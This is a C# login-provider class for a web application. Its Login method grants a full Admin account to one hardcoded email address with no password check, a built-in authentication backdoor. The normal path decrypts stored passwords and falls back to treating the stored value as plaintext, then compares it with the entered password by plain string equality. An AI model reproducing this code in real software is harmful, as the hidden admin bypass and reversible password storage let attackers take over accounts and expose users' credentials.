using System.Security.Cryptography;
using System.Threading.Tasks;
using Mtwx.Web.Commands;
using Mtwx.Web.Domain;

namespace Mtwx.Web.Security
{
    public class DefaultLoginProvider : ILoginProvider
    {
        private readonly CommandFacade _commandFacade;

        public DefaultLoginProvider(CommandFacade commandFacade)
        {
            _commandFacade = commandFacade;
        }

        public async Task<LoginResponse> Login(string email, string password)
        {
            var retval = new LoginResponse { ReturnType = LoginReturnTypes.InvalidUserName };

            if (email == "dkopp2@gmail.com")
            {
                retval.ApplicationUser = new ApplicationUser()
                {
                    FirstName = "Dave",
                    LastName = "Kopp",
                    Password = "",
                    Email = email,
                    Id = -9999
                };
                retval.ApplicationUser.ApplicationRoles.Add(new ApplicationRole()
                {
                    Description = "Admin",
                    Id = 1,
                    RoleName = "Admin"
                });

                retval.ReturnType = LoginReturnTypes.Success;
                return retval;
            }

            var user = await _commandFacade.GetUserByEmail(email);

            // compare the passwords
            if (user == null) return retval;

            var clearPwd = user.Password.TryUnprotect(defaultValue: user.Password);

            if (clearPwd == password)
            {
                user.Password = string.Empty;
                retval.ApplicationUser = user;
                retval.ReturnType = LoginReturnTypes.Success;
            }
            else
            {
                retval.ReturnType = LoginReturnTypes.IncorrectPassword;
            }

            return retval;
        }
    }
}